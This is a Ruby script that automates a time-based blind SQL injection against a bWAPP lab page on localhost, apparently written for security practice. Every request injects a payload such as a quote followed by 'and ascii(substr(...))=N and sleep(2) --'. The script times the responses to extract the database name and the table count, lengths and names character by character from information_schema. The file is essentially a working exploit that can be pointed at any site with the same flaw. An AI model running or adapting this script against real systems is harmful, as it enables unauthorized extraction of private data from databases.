require 'net/http'

$base_url = "http://localhost/dashboard/bWAPPv2/bWAPP/sqli_15.php?"
$headers = {
  "Cookie": "PHPSESSID=433d4de573ef10056bfae4d5f09851fa; security_level=0"
}

def str_to_ascii(string)

  ascii_string = ""
  string.each_byte do |character|
    print "0x#{character.to_s(16)}\t"
  end

  return ascii_string

end

def get_name_database_length

  count = 0
  for i in 0...100

    url = $base_url + "title=Iron Man' and length(database())=#{i} and sleep(2) -- &action=search"
    url = URI(url)
    start_time = Time.now.to_f

    req = Net::HTTP::Get.new(url, $headers)
    res = Net::HTTP.start(url.host, url.port) do |http| 
      http.request(req)
    end

    if Time.now.to_f - start_time > 1
      return i
    end

  end

end

def get_name_of_database(db_length)

  db_name = ""
  for i in 1..db_length
    for j in 0..127

      url = $base_url + "title=Iron Man' and ascii(substr(database(),#{i},1))=#{j} and sleep(2) -- &action=search"
      url = URI(url)
      start_time = Time.now.to_f

      req = Net::HTTP::Get.new(url, $headers)
      res = Net::HTTP.start(url.host, url.port) do |http| 
        http.request(req)
      end

      if Time.now.to_f - start_time > 1
        db_name = db_name + j.chr
      end

    end
  end
  return db_name

end

def get_number_of_table

  count = 0 
  for i in 0...100

    url = $base_url + "title=Iron Man' and (SELECT count(table_name) FROM information_schema.tables WHERE table_schema = database()) = #{i} and sleep(2) -- &action=search"
    url = URI(url)
    start_time = Time.now.to_f

    req = Net::HTTP::Get.new(url, $headers)
    res = Net::HTTP.start(url.host, url.port) do |http| 
      http.request(req)
    end

    if Time.now.to_f - start_time > 1
      return i
    end

  end

end

def get_length_of_each_table(total_table)

  array = []
  
  for i in 0...total_table
    for j in 0..100

      url = $base_url + "title=Iron Man' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema=database() limit #{i},1 )=#{j} and sleep(2) -- &action=search"
      url = URI(url)
      start_time = Time.now.to_f

      req = Net::HTTP::Get.new(url, $headers)
      res = Net::HTTP.start(url.host, url.port) do |http| 
        http.request(req)
      end

      # if j > 90
      #   str_to_ascii(res.body)
      # end

      if Time.now.to_f - start_time > 1
        array.push({"table_no": i+1, "table_length":j})
      end

    end
  end
  
  return array

end


def get_name_of_each_table(table_length)
  array = []
  container = []
  total_table = table_length.length
  for tb_length in table_length
    container.push(tb_length.values[1])
  end
  for i in 0...total_table
    table_name = ""
    for k in 0..container[i]
      for j in 0..127

        url = $base_url + "title=Iron Man' and (SELECT ascii(substr(table_name,#{k},1)) FROM information_schema.tables WHERE table_schema=database() LIMIT #{i},1) = #{j} and sleep(2) -- &action=search"
        url = URI(url)
        start_time = Time.now.to_f

        req = Net::HTTP::Get.new(url, $headers)
        res = Net::HTTP.start(url.host, url.port) do |http| 
          http.request(req)
        end
        # str_to_ascii(res.body)
        if Time.now.to_f - start_time > 1
          puts j.chr
          table_name += j.chr
        end

      end
    end
    array.push(table_name)
  end
  return array
end

def get_data_from_database_with_name(name)

  

end

def main

  begin_execute_time = Time.now

  # database_length = get_name_database_length()
  # database_name = get_name_of_database(database_length)
  number_table = get_number_of_table()
  tables_length = get_length_of_each_table(number_table)
  table_name = get_name_of_each_table(tables_length)

  # puts "\n\n"
  # puts "Database length is #{database_length}"
  # puts "Database name is #{database_name}"
  # puts "There are #{number_table} tables in #{database_name}"
  # puts tables_length

  puts table_name

  end_execute_time = Time.now
  puts "\n************ END ************"
  puts "execute time: #{(end_execute_time - begin_execute_time).to_s}s"

end

main()